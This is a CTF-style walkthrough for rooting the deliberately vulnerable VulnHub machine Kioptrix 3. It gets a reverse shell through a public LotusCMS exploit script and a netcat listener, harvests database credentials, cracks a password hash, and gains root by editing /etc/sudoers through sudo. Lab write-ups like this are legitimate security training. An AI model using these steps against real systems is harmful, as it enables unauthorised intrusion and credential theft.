# Kioptrix Level 3

Today, we will be pwning the VulnHub machine Kioptrix 3. The final machine in the Kioptrix series. Congrats on getting this far!

  

# Enumeration

  

Once you have obtained the machine's IP address, we will perform a routine nmap scan using the `-sV` and `-sC` flags.

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_13-42-31.png?raw=true)

  

As you can see from the scan, we seem to have a SSH server and an Apache server running version `2.2.8`.

Upon visiting the IP in our browser, we are greeted with some sort of gallery website. After a bit of searching, the "login" tab seems to spark a few ideas.

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_14-12-21.png?raw=true)

  

We could try **SQL injection** but after testing a few payloads such as `'#`, we have no luck. Using **searchsploit**, it is apparent that there is a vulnerability for LotusCMS (which the login page is powered by).

  
![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_14-14-45.png?raw=true)
  

The first payload does seem to be a good choice however for the purpose of this tutorial I'll be using [this exploit](https://github.com/Hood3dRob1n/LotusCMS-Exploit).
  

```bash

git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit

cd LotusCMS-Exploit

./lotusRCE.sh

# answering prompts:

[host-ip]

4444

```

Now, you will need to setup a netcat listener in another terminal.

```bash

nc -lvnp 4444

```

Finally, you can obtain a reverse shell on the machine by entering the letter 1 (on the LotusCMS script).

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_14-41-34.png?raw=true)

  

From the image, we can see that we have successfully gotten a reverse shell! However, we need to pimp it up a little so enter:

```

python -c 'import pty; pty.spawn("/bin/bash")'

```

Now you'll have a much more responsive shell! Now we need to perform some more enumeration. Firstly, I'll checkout the `/etc/passwd` file. Two users seems to catch my eye - loneferret and dreg.

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_14-44-31.png?raw=true)

  

As you can see from the image, we have entered the home directory of loneferret to checkout what they've got hiding! After running `ls`, the company policy file seems to be the most interesting.

It seems to want us to run `sudo ht`, after doing so, we are faced with a massive brickwall....We don't know the password!

After searching through this machine for a while, the subdirectory of `/home` named `www` catches my attention. Inside it, seems to be the files for the Kioptrix website. Upon entering this directory and running `ls`, nothing of proper interest seems to come up.

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_14-54-22.png?raw=true)

  

After searching around a bit more, we come across the file `/home/www/kioptrix3.com/gallery/gconfig.php`. After viewing the contents of the file it is apparent it contains some db credentials! However, there does not seem to be much these credentials could be for. So we'll run gobuster quickly to identify any further entry points.

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_15-01-09.png?raw=true)

  

```

gobuster dir --url http://[machine-ip] --wordlist /usr/share/wordlists/dirb/common.txt

```

> Directory of wordlist for Kali only, if on other OS please install the Dirb common.txt wordlist.

  

Finally something good! Using the login credentials we can login to the phpmyadmin console that gobuster found.

  

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-07_15-01-47.png?raw=true)

  

We have successfully gained access to the/a database! After sifting through a bit, I manage to spot some account details located in the gallery database under the `dev_accounts` table. From here, we can crack the hashes for these accounts using https://crackstation.net. First, lets try the hash for the loneferret account. After entering our hash, we are told that the hash evaluates to the password `starwars`! Remeber that SSH server? We'll be using these credentials to log into that now. However, I'm not sure if the following is a bug or not but to be able to properly login to the SSH server we must use some alternate **Host Key Algorithms**, meaning the command used to login to the server is as follows:
```bash
ssh -oHostKeyAlgorithms=+ssh-dss loneferret@[machine-ip]
```

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-08_13-38-40.png?raw=true)

As shown in the image, we have successfully logged into the machine as `loneferret`. To check our sudo permissions we may run `sudo -l`. After doing so, we are told we can use `sudo` without a password to run the following `/usr/bin/su`, `/usr/local/bin/ht` and `/bin/bash`. Earlier, we looked at a company policy file with told us to type `sudo ht`, furthermore, looking at the output of the command we just used, we should be able to run `sudo ht` without any issues!

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-08_13-45-30.png?raw=true)

> If you face the error show in the image please first run `export TERM=xterm`.

After running `sudo ht`, you should be greeted with some sort of text editor interface.

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-08_13-46-16.png?raw=true)

Since we have run `ht` as superuser, we can edit the `sudoers` file to give us root permissions, to do so, enter `ALT-F`, then select the `Open` option, press enter and input the directory `/etc/sudoers`. Now you can add /bin/sh to the loneferret user privilege specification as shown in the image.

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-08_13-50-51.png?raw=true)

After this, just hit `ALT-F`, then select the `Save` option, then hit `ALT-F` again and select the option quit. From here you may simply run `sudo /bin/sh` and you will have root!

![enter image description here](https://github.com/benjibrown/CTF-writeups/blob/main/VulnHub/images/kioptrix3/Screenshot_2022-11-08_13-53-25.png?raw=true)

Congrats on pwning Kioptrix 3! ;)
